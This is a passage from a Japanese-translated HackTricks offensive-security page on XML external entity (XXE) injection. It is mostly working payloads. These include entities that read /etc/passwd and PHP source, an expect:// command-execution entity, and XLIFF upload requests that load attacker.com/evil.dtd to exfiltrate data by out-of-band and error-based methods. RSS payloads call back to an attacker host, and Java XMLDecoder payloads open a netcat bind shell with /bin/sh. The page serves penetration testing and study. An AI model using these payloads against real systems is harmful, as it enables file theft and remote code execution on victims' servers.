<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### リモートコード実行

**PHPの"expect"モジュールがロードされている場合**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

このセクションは [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe) から取られました。\
[Wikipedia](https://en.wikipedia.org/wiki/XLIFF) によると：

> XLIFF (XML Localization Interchange File Format) は、ローカリゼーションプロセス中にツール間でローカライズ可能なデータが渡される方法を標準化し、CATツール交換のための共通フォーマットを作成するために作られた、XMLベースのビテキストフォーマットです。

### Blind request
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
サーバーはエラーで応答します：
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
しかし、Burp Collaboratorでヒットがありました。

### Out of Bandを介したデータの抽出
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
### エラーを利用したデータの抽出

DTDファイル：
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
サーバーの応答：
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
素晴らしい！`non-exist` ファイルがエラーメッセージに反映されました。次はファイル内容の追加です。

DTDファイル：
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
And the content of the file was successfully **HTTP経由で送信されたエラーの出力に印刷されました**。

## RSS - XEE

XXE脆弱性を悪用するための有効なRSS形式のXML。

### Ping back

攻撃者サーバーへのシンプルなHTTPリクエスト
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### ファイルを読む
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### ソースコードの読み取り

PHP base64フィルターを使用して
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEEからRCEへ

XMLDecoderは、XMLメッセージに基づいてオブジェクトを作成するJavaクラスです。悪意のあるユーザーがアプリケーションに任意のデータを**readObject**メソッドの呼び出しに使用させることができれば、サーバー上で即座にコード実行を行うことができます。

### Runtime().exec()の使用
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## ツール

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## その他のリソース

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
独自の外部DTDを使用してHTTP経由で情報を抽出する: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
